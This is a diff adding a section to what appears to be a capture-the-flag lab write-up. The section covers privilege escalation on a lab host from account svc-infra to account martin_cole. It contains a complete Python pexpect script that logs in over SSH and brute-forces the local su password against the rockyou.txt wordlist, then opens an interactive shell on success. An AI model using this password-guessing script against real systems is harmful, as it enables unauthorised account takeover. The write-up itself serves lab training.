@@ -378,7 +378,57 @@ ssh svc-infra@10.129.79.103
 
 
 
+> No obvious direct privilege escalation path was identified, as there are no unusual SUID binaries, writable cron jobs, or exploitable shared group permissions. Another user, martin_cole, has a valid shell, but direct SSH password authentication does not appear to be a viable option externally. However, switching to martin_cole via su from the existing svc-infra SSH session is possible, making a password audit using rockyou.txt against the local su authentication the intended route.
 
+
+
+```
+#!/usr/bin/env python3
+# /tmp/su_brute.py
+
+import pexpect
+import sys
+
+TARGET = "10.129.79.103"       # 
+SVC_USER = "svc-infra"
+SVC_PASS = "<PASSWORD>"
+TARGET_USER = "martin_cole"
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+child = pexpect.spawn(f"ssh -o StrictHostKeyChecking=no {SVC_USER}@{TARGET}",
+                      timeout=15, encoding="utf-8")
+child.expect("password:")
+child.sendline(SVC_PASS)
+child.expect(r"\$")
+
+with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as f:
+    for i, line in enumerate(f):
+        pw = line.strip()
+        if not pw:
+            continue
+
+        child.sendline(f"su {TARGET_USER}")
+        idx = child.expect(["Password:", pexpect.TIMEOUT], timeout=5)
+        if idx != 0:
+            continue
+
+        child.sendline(pw)
+        idx2 = child.expect(["su: Authentication failure", r"\$", pexpect.TIMEOUT], timeout=5)
+        if idx2 == 1:
+            print(f"\n[+] FOUND PASSWORD for {TARGET_USER}: {pw}")
+            child.interact()
+            sys.exit(0)
+        elif idx2 == 2:
+            print(f"[!] timeout on password: {pw}")
+
+        if i % 500 == 0 and i > 0:
+            print(f"[*] tried {i} passwords...")
+
+print("\n[-] Password not found in wordlist")
+```
+
+
+<img width="862" height="135" alt="image" src="https://github.com/user-attachments/assets/e5130fd5-5cac-44c1-a9e0-cb2cd7772633" />
 
 
 
